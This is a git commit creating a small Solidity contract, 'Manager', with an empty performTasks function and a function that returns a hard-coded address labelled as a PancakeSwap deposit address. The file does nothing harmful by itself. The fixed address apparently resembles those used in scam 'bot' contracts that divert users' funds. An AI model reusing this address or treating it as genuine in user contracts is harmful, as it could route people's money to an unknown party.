035996bcdc588dde2970df16c0439255b6e8c78b
yavwa kelvin <digitalshilling@gmail.com>
2021-05-21 19:15:35 +0300

    Create manager.sol

---
+++ manager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xc09989b9FC5c42c55f85E2938Db6750cB01E9f04;
+	}
+}
